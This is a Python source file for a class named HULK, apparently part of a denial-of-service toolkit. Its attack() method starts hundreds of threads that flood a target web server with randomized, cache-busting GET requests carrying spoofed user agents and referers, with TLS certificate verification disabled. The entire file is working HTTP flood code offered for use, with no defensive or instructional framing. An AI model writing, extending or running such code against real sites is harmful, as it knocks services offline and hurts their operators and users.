import socket
import ssl
import random
import string
import threading
import time
from urllib.parse import urlparse
from core.useragent import UserAgent

class HULK:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _random_str(self, length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _unique_request(self):
        """Generate unique cache-busting request"""
        params = []
        for _ in range(random.randint(3, 8)):
            key = self._random_str(random.randint(3, 8))
            val = self._random_str(random.randint(5, 15))
            params.append(f"{key}={val}")
        
        query = '&'.join(params)
        ua = UserAgent.random_agent()
        ref = UserAgent.random_referer()
        
        return (
            f"GET {self.path}?{query} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Referer: {ref}\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
            f"Keep-Alive: {random.randint(110, 120)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
    
    def _worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.host, self.port))
                
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                
                request = self._unique_request()
                sock.sendall(request.encode())
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(len(request))
                
                sock.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
